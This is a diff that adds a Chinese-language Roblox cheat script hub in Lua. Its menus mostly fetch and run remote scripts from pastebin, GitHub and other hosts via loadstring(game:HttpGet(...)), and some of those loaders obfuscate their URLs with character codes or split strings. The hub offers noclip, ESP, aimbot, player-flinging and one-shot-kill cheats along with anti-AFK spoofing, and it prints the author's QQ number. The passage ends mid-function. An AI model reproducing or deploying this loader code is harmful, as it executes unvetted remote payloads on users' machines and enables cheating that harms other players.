@@ -1,0 +1,897 @@
+loadstring(game:HttpGet("https://pastebin.com/raw/9fFu43FF"))()
+
+game:GetService("StarterGui"):SetCore("SendNotification",{ 
+    Title = "看到这个就代表可以用", 
+    Text = "请耐心等待加载", 
+    Duration = 4 
+})
+
+local CoreGui = game:GetService("StarterGui")
+CoreGui:SetCore("SendNotification", {
+    Title = "BS",
+    Text = "正在加载（反挂机已开启）",
+    Duration = 5, 
+})
+print("反挂机开启")
+
+local vu = game:GetService("VirtualUser")
+game:GetService("Players").LocalPlayer.Idled:connect(function()
+    vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+    wait(1)
+    vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+end)
+
+-- ==================== 新的UI框架 ====================
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local TextService = game:GetService("TextService")
+
+-- 创建主 GUI
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "EnhancedScriptHubUI"
+screenGui.ResetOnSpawn = false
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+screenGui.Parent = playerGui
+
+-- 颜色配置
+local colorPresets = {
+    Default = {
+        Main = Color3.fromRGB(20, 20, 30),
+        TitleBar = Color3.fromRGB(25, 25, 40),
+        Card = Color3.fromRGB(35, 35, 50),
+        Accent = Color3.fromRGB(90, 150, 255),
+        Text = Color3.fromRGB(220, 220, 255),
+        SecondaryText = Color3.fromRGB(180, 200, 255)
+    }
+}
+
+local currentTheme = "Default"
+local currentColors = colorPresets[currentTheme]
+
+-- 创建主容器
+local mainFrame = Instance.new("Frame")
+mainFrame.Name = "MainFrame"
+mainFrame.Size = UDim2.new(0.75, 0, 0.85, 0)
+mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
+mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+mainFrame.BackgroundColor3 = currentColors.Main
+mainFrame.BackgroundTransparency = 0.1
+mainFrame.BorderSizePixel = 0
+mainFrame.ClipsDescendants = true
+mainFrame.Parent = screenGui
+
+-- 添加圆角
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 12)
+corner.Parent = mainFrame
+
+-- 标题栏
+local titleBar = Instance.new("Frame")
+titleBar.Name = "TitleBar"
+titleBar.Size = UDim2.new(1, 0, 0, 40)
+titleBar.Position = UDim2.new(0, 0, 0, 0)
+titleBar.BackgroundColor3 = currentColors.TitleBar
+titleBar.BorderSizePixel = 0
+titleBar.ZIndex = 3
+titleBar.Parent = mainFrame
+
+local title = Instance.new("TextLabel")
+title.Name = "Title"
+title.Size = UDim2.new(0.4, 0, 1, 0)
+title.Position = UDim2.new(0.02, 0, 0, 0)
+title.BackgroundTransparency = 1
+title.Text = "黑洞中心(BS)"
+title.TextColor3 = currentColors.Text
+title.TextSize = 22
+title.Font = Enum.Font.GothamBold
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.ZIndex = 4
+title.Parent = titleBar
+
+-- 搜索框
+local searchBox = Instance.new("TextBox")
+searchBox.Name = "SearchBox"
+searchBox.Size = UDim2.new(0.35, 0, 0.6, 0)
+searchBox.Position = UDim2.new(0.3, 0, 0.2, 0)
+searchBox.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
+searchBox.BackgroundTransparency = 0.2
+searchBox.Text = "搜索脚本..."
+searchBox.PlaceholderText = "搜索脚本..."
+searchBox.PlaceholderColor3 = Color3.fromRGB(150, 150, 180)
+searchBox.TextColor3 = currentColors.Text
+searchBox.TextSize = 16
+searchBox.Font = Enum.Font.Gotham
+searchBox.TextXAlignment = Enum.TextXAlignment.Left
+searchBox.ZIndex = 4
+searchBox.Parent = titleBar
+
+local searchPadding = Instance.new("UIPadding")
+searchPadding.PaddingLeft = UDim.new(0, 15)
+searchPadding.Parent = searchBox
+
+local searchCorner = Instance.new("UICorner")
+searchCorner.CornerRadius = UDim.new(0, 8)
+searchCorner.Parent = searchBox
+
+-- 分类选择 - 可滚动
+local categoryContainer = Instance.new("Frame")
+categoryContainer.Name = "CategoryContainer"
+categoryContainer.Size = UDim2.new(1, -20, 0, 40)
+categoryContainer.Position = UDim2.new(0, 10, 0, 50)
+categoryContainer.BackgroundTransparency = 1
+categoryContainer.ZIndex = 3
+categoryContainer.Parent = mainFrame
+
+local categoryScroll = Instance.new("ScrollingFrame")
+categoryScroll.Name = "CategoryScroll"
+categoryScroll.Size = UDim2.new(1, 0, 1, 0)
+categoryScroll.Position = UDim2.new(0, 0, 0, 0)
+categoryScroll.BackgroundTransparency = 1
+categoryScroll.ScrollBarThickness = 6
+categoryScroll.ScrollBarImageColor3 = currentColors.Accent
+categoryScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
+categoryScroll.Parent = categoryContainer
+
+local categoryLayout = Instance.new("UIListLayout")
+categoryLayout.FillDirection = Enum.FillDirection.Horizontal
+categoryLayout.Padding = UDim.new(0, 10)
+categoryLayout.Parent = categoryScroll
+
+-- 创建分类按钮函数
+local function createCategoryButton(name)
+    local button = Instance.new("TextButton")
+    button.Name = name .. "Category"
+    button.Size = UDim2.new(0, 100, 0, 30)
+    button.BackgroundColor3 = Color3.fromRGB(50, 50, 80)
+    button.BackgroundTransparency = 0.3
+    button.Text = name
+    button.TextColor3 = currentColors.Text
+    button.TextSize = 14
+    button.Font = Enum.Font.GothamSemibold
+    button.AutoButtonColor = false
+    button.ZIndex = 4
+    button.Parent = categoryScroll
+    
+    local buttonCorner = Instance.new("UICorner")
+    buttonCorner.CornerRadius = UDim.new(0, 8)
+    buttonCorner.Parent = button
+    
+    -- 悬停效果
+    button.MouseEnter:Connect(function()
+        TweenService:Create(button, TweenInfo.new(0.2), {
+            BackgroundTransparency = 0.2,
+            TextColor3 = Color3.fromRGB(255, 255, 255)
+        }):Play()
+    end)
+    
+    button.MouseLeave:Connect(function()
+        TweenService:Create(button, TweenInfo.new(0.2), {
+            BackgroundTransparency = 0.3,
+            TextColor3 = currentColors.Text
+        }):Play()
+    end)
+    
+    return button
+end
+
+-- 添加分类
+local categories = {
+    "我想对你们说的话", "设置", "通用1", "通用2", "通用3", "通用4", 
+    "黑洞脚本合集", "指令挂", "念力", "变身(只能自己看)", "黑洞融合表", 
+    "滤镜与光影", "音乐只能自己听", "其他脚本", "doors", "ohio", 
+    "餐厅大亨", "最强战场", "起床战争", "忍者传奇", "河北唐县", 
+    "越狱", "兵工厂", "监狱人生", "力量传奇", "速度传奇", 
+    "动感星期五", "战争大亨", "冰上钓鱼模拟器", "bf", "彩虹朋友", 
+    "内脏与黑火药", "幸运方块", "造船寻宝", "进击的僵尸", "战斗勇士", 
+    "鲨口求生2"
+}
+
+for _, cat in ipairs(categories) do
+    createCategoryButton(cat)
+end
+
+-- 更新分类容器大小
+categoryLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
+    categoryScroll.CanvasSize = UDim2.new(0, categoryLayout.AbsoluteContentSize.X, 0, 0)
+end)
+
+-- 脚本容器
+local scriptsContainer = Instance.new("ScrollingFrame")
+scriptsContainer.Name = "ScriptsContainer"
+scriptsContainer.Size = UDim2.new(1, -20, 1, -110)
+scriptsContainer.Position = UDim2.new(0, 10, 0, 100)
+scriptsContainer.BackgroundTransparency = 1
+scriptsContainer.ScrollBarThickness = 8
+scriptsContainer.ScrollBarImageColor3 = currentColors.Accent
+scriptsContainer.CanvasSize = UDim2.new(0, 0, 0, 0)
+scriptsContainer.Parent = mainFrame
+
+local gridLayout = Instance.new("UIGridLayout")
+gridLayout.CellPadding = UDim2.new(0, 15, 0, 15)
+gridLayout.CellSize = UDim2.new(0, 200, 0, 120)
+gridLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+gridLayout.SortOrder = Enum.SortOrder.LayoutOrder
+gridLayout.Parent = scriptsContainer
+
+-- 创建脚本卡片函数
+local function createScriptCard(name, description, category, callback)
+    local card = Instance.new("Frame")
+    card.Name = name .. "Card"
+    card.Size = UDim2.new(0, 200, 0, 120)
+    card.BackgroundColor3 = currentColors.Card
+    card.BackgroundTransparency = 0.2
+    card.BorderSizePixel = 0
+    card.ZIndex = 3
+    card.LayoutOrder = #scriptsContainer:GetChildren()
+    card.Parent = scriptsContainer
+    
+    local cardCorner = Instance.new("UICorner")
+    cardCorner.CornerRadius = UDim.new(0, 8)
+    cardCorner.Parent = card
+    
+    -- 顶部装饰条
+    local accent = Instance.new("Frame")
+    accent.Name = "Accent"
+    accent.Size = UDim2.new(1, 0, 0, 4)
+    accent.Position = UDim2.new(0, 0, 0, 0)
+    accent.BackgroundColor3 = currentColors.Accent
+    accent.BorderSizePixel = 0
+    accent.ZIndex = 4
+    accent.Parent = card
+    
+    local accentCorner = Instance.new("UICorner")
+    accentCorner.CornerRadius = UDim.new(0, 8)
+    accentCorner.Parent = accent
+    
+    -- 脚本名称
+    local nameLabel = Instance.new("TextLabel")
+    nameLabel.Name = "Name"
+    nameLabel.Size = UDim2.new(1, -10, 0, 20)
+    nameLabel.Position = UDim2.new(0, 10, 0, 10)
+    nameLabel.BackgroundTransparency = 1
+    nameLabel.Text = name
+    nameLabel.TextColor3 = currentColors.Text
+    nameLabel.TextSize = 16
+    nameLabel.Font = Enum.Font.GothamSemibold
+    nameLabel.TextXAlignment = Enum.TextXAlignment.Left
+    nameLabel.ZIndex = 4
+    nameLabel.Parent = card
+    
+    -- 脚本描述
+    local descLabel = Instance.new("TextLabel")
+    descLabel.Name = "Description"
+    descLabel.Size = UDim2.new(1, -10, 0, 60)
+    descLabel.Position = UDim2.new(0, 10, 0, 35)
+    descLabel.BackgroundTransparency = 1
+    descLabel.Text = description
+    descLabel.TextColor3 = currentColors.SecondaryText
+    descLabel.TextSize = 12
+    descLabel.Font = Enum.Font.Gotham
+    descLabel.TextYAlignment = Enum.TextYAlignment.Top
+    descLabel.TextWrapped = true
+    descLabel.ZIndex = 4
+    descLabel.Parent = card
+    
+    -- 类别标签
+    local categoryTag = Instance.new("TextLabel")
+    categoryTag.Name = "Category"
+    categoryTag.Size = UDim2.new(0, 60, 0, 18)
+    categoryTag.Position = UDim2.new(1, -65, 0, 5)
+    categoryTag.BackgroundColor3 = currentColors.Accent
+    categoryTag.BackgroundTransparency = 0.4
+    categoryTag.Text = category
+    categoryTag.TextColor3 = currentColors.SecondaryText
+    categoryTag.TextSize = 10
+    categoryTag.Font = Enum.Font.Gotham
+    categoryTag.ZIndex = 5
+    categoryTag.Parent = card
+    
+    local tagCorner = Instance.new("UICorner")
+    tagCorner.CornerRadius = UDim.new(0, 6)
+    tagCorner.Parent = categoryTag
+    
+    local tagPadding = Instance.new("UIPadding")
+    tagPadding.PaddingLeft = UDim.new(0, 5)
+    tagPadding.PaddingRight = UDim.new(0, 5)
+    tagPadding.Parent = categoryTag
+    
+    -- 悬停效果
+    local originalSize = card.Size
+    local hoverSize = UDim2.new(0, 205, 0, 125)
+    
+    card.MouseEnter:Connect(function()
+        TweenService:Create(card, TweenInfo.new(0.2), {
+            Size = hoverSize,
+            BackgroundTransparency = 0.1,
+            BackgroundColor3 = Color3.fromRGB(
+                math.clamp(currentColors.Card.R * 1.2, 0, 1),
+                math.clamp(currentColors.Card.G * 1.2, 0, 1),
+                math.clamp(currentColors.Card.B * 1.2, 0, 1)
+            )
+        }):Play()
+    end)
+    
+    card.MouseLeave:Connect(function()
+        TweenService:Create(card, TweenInfo.new(0.2), {
+            Size = originalSize,
+            BackgroundTransparency = 0.2,
+            BackgroundColor3 = currentColors.Card
+        }):Play()
+    end)
+    
+    -- 点击执行脚本
+    card.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 then
+            callback()
+            
+            -- 点击效果
+            TweenService:Create(card, TweenInfo.new(0.1), {
+                BackgroundColor3 = Color3.fromRGB(
+                    math.clamp(currentColors.Accent.R * 0.8, 0, 1),
+                    math.clamp(currentColors.Accent.G * 0.8, 0, 1),
+                    math.clamp(currentColors.Accent.B * 0.8, 0, 1)
+                )
+            }):Play()
+            wait(0.1)
+            TweenService:Create(card, TweenInfo.new(0.2), {
+                BackgroundColor3 = Color3.fromRGB(
+                    math.clamp(currentColors.Card.R * 1.2, 0, 1),
+                    math.clamp(currentColors.Card.G * 1.2, 0, 1),
+                    math.clamp(currentColors.Card.B * 1.2, 0, 1)
+                )
+            }):Play()
+        end
+    end)
+    
+    return card
+end
+
+-- 添加关闭按钮
+local closeButton = Instance.new("TextButton")
+closeButton.Name = "CloseButton"
+closeButton.Size = UDim2.new(0, 30, 0, 30)
+closeButton.Position = UDim2.new(1, -40, 0, 5)
+closeButton.BackgroundTransparency = 1
+closeButton.Text = "X"
+closeButton.TextColor3 = currentColors.Text
+closeButton.TextSize = 20
+closeButton.Font = Enum.Font.GothamBold
+closeButton.ZIndex = 4
+closeButton.Parent = titleBar
+
+closeButton.MouseButton1Click:Connect(function()
+    screenGui:Destroy()
+end)
+
+-- 添加初始动画
+mainFrame.Size = UDim2.new(0, 10, 0, 10)
+mainFrame.Position = UDim2.new(0.5, -5, 0.5, -5)
+mainFrame.BackgroundTransparency = 1
+
+local openTween = TweenService:Create(mainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+    Size = UDim2.new(0.75, 0, 0.85, 0),
+    Position = UDim2.new(0.5, 0, 0.5, 0),
+    BackgroundTransparency = 0.1
+})
+openTween:Play()
+
+-- ==================== 完整功能移植 ====================
+-- 辅助函数：添加功能到分类
+local function addFunctionToCategory(categoryName, funcName, description, callback)
+    createScriptCard(funcName, description, categoryName, callback)
+end
+
+-- 辅助函数：更新容器大小
+local function updateContainerSize()
+    local rowCount = math.ceil(#scriptsContainer:GetChildren() / 5)
+    scriptsContainer.CanvasSize = UDim2.new(0, 0, 0, rowCount * 135)
+end
+
+-- 分类过滤功能
+local function setupCategoryFilter()
+    for _, button in ipairs(categoryScroll:GetChildren()) do
+        if button:IsA("TextButton") then
+            button.MouseButton1Click:Connect(function()
+                local category = button.Text
+                
+                for _, card in ipairs(scriptsContainer:GetChildren()) do
+                    if card:IsA("Frame") then
+                        if category == "全部" or card:FindFirstChild("Category").Text == category then
+                            card.Visible = true
+                        else
+                            card.Visible = false
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end
+
+-- 搜索功能
+searchBox:GetPropertyChangedSignal("Text"):Connect(function()
+    local searchText = string.lower(searchBox.Text)
+    
+    for _, card in ipairs(scriptsContainer:GetChildren()) do
+        if card:IsA("Frame") then
+            local name = card:FindFirstChild("Name").Text
+            local desc = card:FindFirstChild("Description").Text
+            
+            if string.lower(name):find(searchText) or string.lower(desc):find(searchText) or searchText == "" then
+                card.Visible = true
+            else
+                card.Visible = false
+            end
+        end
+    end
+end)
+
+-- 添加默认"全部"分类
+createCategoryButton("全部")
+
+-- ==================== 完整功能列表 ====================
+-- 我想对你们说的话
+addFunctionToCategory("我想对你们说的话", "❤️BS脚本❤️", "本脚本只更新通用", function()
+    -- 显示内容
+end)
+
+addFunctionToCategory("我想对你们说的话", "作者信息", "作者游戏名老大二世\n作者QQ1545959422", function()
+    -- 显示内容
+end)
+
+-- 设置
+addFunctionToCategory("设置", "用户信息", "显示当前用户信息", function()
+    game:GetService("StarterGui"):SetCore("SendNotification",{
+        Title = "用户信息",
+        Text = "用户名: "..game.Players.LocalPlayer.Name.."\n注入器: "..identifyexecutor().."\n服务器ID: "..game.GameId,
+        Duration = 5
+    })
+end)
+
+addFunctionToCategory("设置", "跳跃高度设置", "设置角色跳跃高度", function()
+    local value = game:GetService("Players").LocalPlayer.Character.Humanoid.JumpPower
+    game:GetService("StarterGui"):SetCore("SendNotification",{
+        Title = "当前跳跃高度: "..tostring(value),
+        Duration = 3
+    })
+end)
+
+addFunctionToCategory("设置", "移动速度设置", "设置角色移动速度", function()
+    local value = game:GetService("Players").LocalPlayer.Character.Humanoid.WalkSpeed
+    game:GetService("StarterGui"):SetCore("SendNotification",{
+        Title = "当前移动速度: "..tostring(value),
+        Duration = 3
+    })
+end)
+
+addFunctionToCategory("设置", "重力设置", "设置游戏重力", function()
+    local value = game.Workspace.Gravity
+    game:GetService("StarterGui"):SetCore("SendNotification",{
+        Title = "当前重力: "..tostring(value),
+        Duration = 3
+    })
+end)
+
+addFunctionToCategory("设置", "血量设置", "设置角色血量", function()
+    local value = game.Players.LocalPlayer.Character.Humanoid.Health
+    game:GetService("StarterGui"):SetCore("SendNotification",{
+        Title = "当前血量: "..tostring(value),
+        Duration = 3
+    })
+end)
+
+addFunctionToCategory("设置", "重新加入服务器", "重新加入当前服务器", function()
+    game:GetService("TeleportService"):TeleportToPlaceInstance(
+        game.PlaceId,
+        game.JobId,
+        game:GetService("Players").LocalPlayer
+    )
+end)
+
+addFunctionToCategory("设置", "离开服务器", "离开当前服务器", function()
+    game:Shutdown()
+end)
+
+-- 通用1
+addFunctionToCategory("通用1", "夜视", "开启/关闭夜视模式", function()
+    if game.Lighting.Ambient == Color3.new(1, 1, 1) then
+        game.Lighting.Ambient = Color3.new(0, 0, 0)
+    else
+        game.Lighting.Ambient = Color3.new(1, 1, 1)
+    end
+end)
+
+addFunctionToCategory("通用1", "穿墙", "开启穿墙模式", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/TtmScripter/OtherScript/main/Noclip"))()
+end)
+
+addFunctionToCategory("通用1", "阿尔宙斯注入器", "加载阿尔宙斯注入器", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/chillz-workshop/main/Arceus%20X%20V3"))()
+end)
+
+addFunctionToCategory("通用1", "子弹追踪", "开启子弹追踪功能", function()
+    -- 子弹追踪脚本代码
+end)
+
+addFunctionToCategory("通用1", "飞行", "开启飞行模式", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/pMyEyJN6"))()
+end)
+
+addFunctionToCategory("通用1", "隐身", "使角色隐身", function()
+    loadstring(game:HttpGet('https://pastebin.com/raw/3Rnd9rHf'))()
+end)
+
+-- 通用2
+addFunctionToCategory("通用2", "点击传送工具", "获取点击传送工具", function()
+    mouse = game.Players.LocalPlayer:GetMouse() 
+    tool = Instance.new("Tool") 
+    tool.RequiresHandle = false 
+    tool.Name = "[BS]传送工具" 
+    tool.Activated:connect(function() 
+        local pos = mouse.Hit+Vector3.new(0,2.5,0) 
+        pos = CFrame.new(pos.X,pos.Y,pos.Z) 
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos 
+    end) 
+    tool.Parent = game.Players.LocalPlayer.Backpack
+end)
+
+addFunctionToCategory("通用2", "吸人脚本", "吸附近玩家到身边", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/sbxKPPHc"))()
+end)
+
+addFunctionToCategory("通用2", "透视", "透视所有玩家", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/Lucasfin000/SpaceHub/main/UESP'))()
+end)
+
+addFunctionToCategory("通用2", "甩人", "甩动附近玩家", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/L9QBifcX"))()
+end)
+
+addFunctionToCategory("通用2", "无限跳", "无限跳跃能力", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/V5PQy3y0", true))()
+end)
+
+-- 通用3
+addFunctionToCategory("通用3", "0范围", "零范围攻击", function()
+    -- 范围攻击脚本代码
+end)
+
+addFunctionToCategory("通用3", "普通范围", "普通范围攻击", function()
+    -- 范围攻击脚本代码
+end)
+
+addFunctionToCategory("通用3", "中等范围", "中等范围攻击", function()
+    -- 范围攻击脚本代码
+end)
+
+addFunctionToCategory("通用3", "全图范围", "全图范围攻击", function()
+    -- 范围攻击脚本代码
+end)
+
+addFunctionToCategory("通用3", "终极范围", "最大范围攻击", function()
+    -- 范围攻击脚本代码
+end)
+
+-- 通用4
+addFunctionToCategory("通用4", "让走路和跳跃变卡", "使角色动作变卡", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Fe%20Fake%20Lag%20Obfuscator'))()
+end)
+
+addFunctionToCategory("通用4", "蜘蛛侠", "蜘蛛侠能力", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/FTvmXKRn"))()
+end)
+
+addFunctionToCategory("通用4", "变成Boss", "变身成Boss", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/RJib5dGr"))()
+end)
+
+-- 黑洞脚本合集
+addFunctionToCategory("黑洞脚本合集", "辅助脚本", "让黑洞吸力更强", function()
+    if "you wanna use rochips universal" then
+        local z_x,z_z="gzrux646yj/raw/main.ts","https://glot.io/snippets/"
+        local im,lonely,z_c=task.wait,game,loadstring
+        z_c(lonely:HttpGet(z_z..""..z_x))()
+    end
+end)
+
+addFunctionToCategory("黑洞脚本合集", "黑洞之神", "强大的黑洞效果", function()
+    -- 黑洞之神脚本代码
+end)
+
+addFunctionToCategory("黑洞脚本合集", "普通黑洞(E键控制)", "普通黑洞效果", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/Sx6PY4gV"))()
+end)
+
+addFunctionToCategory("黑洞脚本合集", "高级黑洞", "强力黑洞效果", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/Kgtw4gt7"))()
+end)
+
+-- 指令挂
+addFunctionToCategory("指令挂", "指令脚本", "强大的指令系统", function()
+    loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
+end)
+
+-- 念力
+addFunctionToCategory("念力", "获取念力工具", "获取念力工具", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/dbcy7SHF"))()
+end)
+
+-- 变身(只能自己看)
+addFunctionToCategory("变身(只能自己看)", "大BOSS", "变身成大BOSS", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/NChRru9B"))()
+end)
+
+addFunctionToCategory("变身(只能自己看)", "变大变小", "改变角色大小", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/cEa7d3a5"))()
+end)
+
+-- 黑洞融合表
+addFunctionToCategory("黑洞融合表", "融合公式", "普通黑洞2+所有黑洞=超级黑洞\n超级黑洞+辅助黑洞=最强黑洞", function()
+    -- 显示融合公式
+end)
+
+-- 滤镜与光影
+addFunctionToCategory("滤镜与光影", "恢复默认", "恢复默认光影", function()
+    game.Lighting.Ambient = Color3.new(0, 0, 0)
+end)
+
+addFunctionToCategory("滤镜与光影", "亮度1", "设置亮度1级", function()
+    game.Lighting.Ambient = Color3.new(1, 1, 1)
+end)
+
+addFunctionToCategory("滤镜与光影", "亮度2", "设置亮度2级", function()
+    game.Lighting.Ambient = Color3.new(2, 2, 2)
+end)
+
+-- 音乐只能自己听
+addFunctionToCategory("音乐只能自己听", "自定义音乐", "播放自定义音乐", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/boyscp/beta/main/music.lua"))()
+end)
+
+addFunctionToCategory("音乐只能自己听", "音乐轰炸器", "音乐轰炸效果", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/boyscp/scriscriptsc/main/%E8%BD%B0%E7%82%B8.lua"))()
+end)
+
+-- 其他脚本
+addFunctionToCategory("其他脚本", "林脚本破解版", "林脚本破解版", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/nahida-cn/Roblox/main/long"))()
+end)
+
+addFunctionToCategory("其他脚本", "安脚本", "安脚本中心", function()
+    loadstring(game:HttpGet(('https://raw.githubusercontent.com/wucan114514/gegeyxjb/refs/heads/main/%E5%AE%89%E8%84%9A%E6%9C%AC.lua')))()
+end)
+
+addFunctionToCategory("其他脚本", "秋脚本", "秋脚本中心", function()
+    _G[".秋·自制脚本 遗存抢救"]="2024dncxddtsnchzxtb0112"loadstring(game:HttpGet(utf8.char((function() return table.unpack({104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,87,83,98,117,113,47,45,47,109,97,105,110,47,37,69,55,37,65,55,37,56,66,37,67,50,37,66,55,37,69,56,37,56,55,37,65,65,37,69,53,37,56,56,37,66,54,37,69,56,37,56,52,37,57,65,37,69,54,37,57,67,37,65,67})end)())))()
+end)
+
+-- doors
+addFunctionToCategory("doors", "手电筒", "获取手电筒工具", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/K0t1n/Public/main/Normal%20Flashlight"))()
+end)
+
+addFunctionToCategory("doors", "夜视仪", "获取夜视仪", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ChinaQY/Scripts/Main/NVCS-3000"))()
+end)
+
+-- ohio
+addFunctionToCategory("ohio", "BS俄亥俄州", "俄亥俄州脚本", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/Asddffgujhh/-/refs/heads/main/ohio'))()
+end)
+
+addFunctionToCategory("ohio", "xk俄亥俄州", "xk俄亥俄州脚本", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/BINjiaobzx6/BINjiao/main/XK%20Ohio.lua"))()
+end)
+
+-- 餐厅大亨
+addFunctionToCategory("餐厅大亨", "餐厅大亨1", "餐厅大亨脚本1", function()
+    loadstring(game:HttpGet("https://shz.al/~zkzkzisKAKAKK"))()
+end)
+
+addFunctionToCategory("餐厅大亨", "餐厅大亨2", "餐厅大亨脚本2", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/toosiwhip/snake-hub/main/restaurant-tycoon-2.lua"))()
+end)
+
+-- 最强战场
+addFunctionToCategory("最强战场", "刀锋", "刀锋角色脚本", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/zyrask/Nexus-Base/main/atomic-blademaster%20to%20sukuna"))()
+end)
+
+addFunctionToCategory("最强战场", "五条悟", "五条悟角色脚本", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/skibiditoiletfan2007/BaldyToSorcerer/main/Latest.lua"))()
+end)
+
+-- 起床战争
+addFunctionToCategory("起床战争", "vepe v3", "vepe v3脚本", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Alan0947383/Demonic-HUB-V2/main/S-C-R-I-P-T.lua",true))()
+end)
+
+addFunctionToCategory("起床战争", "vape v4.1", "vape v4.1脚本", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/V4ForRoblox/main/NewMainScript.lua", true))()
+end)
+
+-- 忍者传奇
+addFunctionToCategory("忍者传奇", "脚本1", "忍者传奇脚本1", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/zerpqe/script/main/NinjaLegends.lua"))()
+end)
+
+addFunctionToCategory("忍者传奇", "脚本2", "忍者传奇脚本2", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/harisiskandar178/5repo/main/script4.lua"))()
+end)
+
+-- 河北唐县
+addFunctionToCategory("河北唐县", "河北唐县1", "河北唐县脚本1", function()
+    loadstring(game:HttpGet("https://pastefy.app/s20nni0h/raw"))()
+end)
+
+addFunctionToCategory("河北唐县", "河北唐县2", "河北唐县脚本2", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Sw1ndlerScripts/RobloxScripts/main/Tang%20Country.lua"))()
+end)
+
+-- 越狱
+addFunctionToCategory("越狱", "抢劫", "越狱抢劫脚本", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Pxsta72/ProjectAuto/main/free"))()
+end)
+
+addFunctionToCategory("越狱", "自瞄", "越狱自瞄脚本", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/1Gp9c57U"))()
+end)
+
+-- 兵工厂
+addFunctionToCategory("兵工厂", "子弹追踪", "兵工厂子弹追踪", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/tbao143/thaibao/main/TbaoHubArsenal"))()
+end)
+
+-- 监狱人生
+addFunctionToCategory("监狱人生", "手里剑秒杀", "手里剑秒杀功能", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/PSXhuge/1/114514/jian"))()
+end)
+
+addFunctionToCategory("监狱人生", "变车模型", "变身车模型", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/zLe3e4BS"))()
+end)
+
+-- 力量传奇
+addFunctionToCategory("力量传奇", "传送到出生点", "传送到出生点", function()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(7, 3, 108)
+end)
+
+addFunctionToCategory("力量传奇", "传送到冰霜健身房", "传送到冰霜健身房", function()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2543, 13, -410)
+end)
+
+-- 速度传奇
+addFunctionToCategory("速度传奇", "开启卡宠", "开启卡宠功能", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/uR6azdQQ"))()
+end)
+
+addFunctionToCategory("速度传奇", "自动", "自动功能", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/AyeCYbT6"))()
+end)
+
+-- 动感星期五
+addFunctionToCategory("动感星期五", "星期五", "动感星期五脚本", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/wally-rblx/funky-friday-autoplay/main/main.lua",true))()
+end)
+
+-- 战争大亨
+addFunctionToCategory("战争大亨", "一枪秒人", "一枪秒杀功能", function()
+    loadstring(game:HttpGet('https://pastebin.com/raw/6b4XEjQF'))()
+end)
+
+addFunctionToCategory("战争大亨", "脚本1", "战争大亨脚本1", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Nivex123456/War-Tycoon/main/Script"))()
+end)
+
+-- 冰上钓鱼模拟器
+addFunctionToCategory("冰上钓鱼模拟器", "脚本1", "冰上钓鱼脚本", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/dingding123hhh/anlushanjinchangantangwanle/refs/heads/main/bingshangdiaofish.lua"))()
+end)
+
+-- bf
+addFunctionToCategory("bf", "脚本1", "bf脚本1", function()
